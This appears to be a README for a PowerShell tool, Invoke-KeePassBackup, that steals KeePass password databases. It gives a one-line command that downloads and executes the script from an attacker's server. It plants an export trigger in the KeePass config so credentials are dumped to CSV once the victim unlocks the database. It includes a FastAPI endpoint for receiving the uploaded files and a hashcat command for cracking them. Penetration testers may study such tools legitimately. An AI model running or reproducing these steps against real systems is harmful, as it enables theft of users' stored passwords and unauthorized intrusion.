# Invoke-KeePassBackup
This PowerShell script is designed to automate the process of sending KeePass databases to a specified endpoint. 🕊️ Quick script for your pentesting arsenal in order to exfiltrate target databases for further exploitation.

## Features
- Automatically locates the KeePass executable and ascertains its version.
- Adds an export trigger to the KeePass configuration if KeePass version is below 2.53.
- Backs up the current KeePass configuration before making changes.
- Scours all KeePass databases on the computer and uploads them to a given endpoint.
- Uses GZip compression for efficient backup size.
  
## Usage
Run the script using the following command:
```powershell
Invoke-KeePassBackup -url "https://backup.endpoint/u"
```

Knowing the real use-case, preferred running is from your own `HTTP(S)`/`WebDAV` server:
```powershell
$ip="192.168.45.218";powershell -nop -c "iex(irm http://$ip/Invoke-KeePassBackup.ps1); Invoke-KeePassBackup http://$ip/u"
```
It will output something like this:
```powershell
--------------- KeePass backup for noah@ITWR02
KeePass location: C:\Program Files\KeePass Password Safe 2\KeePass.exe
KeePass version: 2.51.1.0
--------------- Adding an export trigger on config file: C:\Users\noah\AppData\Roaming\KeePass\KeePass.config.xml
Backup of current config file done at: C:\Users\noah\AppData\Roaming\KeePass\KeePass.config.backup.xml
Export location: C:\Users\noah\AppData\Local\Temp\KeePassBackup.csv
Setup Complete!
To trigger the KeePass backup and upload, open your KeePass with master password.
--------------- Scanning for KeePass databases on ITWR02
Found KeePass database at: C:\Users\noah\Documents\Database.kdbx
Uploaded noah@ITWR02-20231012-Database.kdbx successfully!
```

The reception endpoint could resemble this FastAPI Python3 code snippet:
```python
@app.post("/u")
async def upload_file(x_file_name: str = Header(...), data: str = Body(...)):
    """
    Handle file upload via POST request.

    Args:
        x_file_name (str): The name of the file, from header.
        data (str): The body of the request containing the uploaded file's data.

    Raises:
        HTTPException: If the filename header is missing.
        HTTPException: If an error occurs during file upload.
    """

    if not x_file_name:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Provide a filename with Header 'X-File-Name'",
        )

    try:
        # Decode the base64 data
        decoded_data = base64.b64decode(data.encode("utf-8"))

        # Check if the data is gzipped by looking at the first two bytes
        if decoded_data[:2] == b"\x1f\x8b":
            # If gzipped, decompress
            buffer = io.BytesIO(decoded_data)
            with gzip.GzipFile(fileobj=buffer, mode="rb") as f:
                processed_data = f.read()
        else:
            # If not gzipped, just use the decoded data as is
            processed_data = decoded_data

        # Save the file
        save_file_content(file_name=x_file_name, data=processed_data)

        return {"status": "success", "message": f"Received {x_file_name}."}

    except Exception as error:
        logger.error(f"Error while processing upload: {error}")
        raise HTTPException(status_code=500)
```

Once database received, to crack the KeePass database hash, first use `keepass2john` to extract the hash. Then, remove the prepended filename, which acts as a username, and utilize `hashcat` with the desired wordlist and rules.
```shell
hashcat $(keepass2john loot/noah@ITWR02-20231012-Database.kdbx | cut -d':' -f2-) -a 0 -O -D 1 -w 3 /usr/share/wordlists/rockyou.txt -m 13400 -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
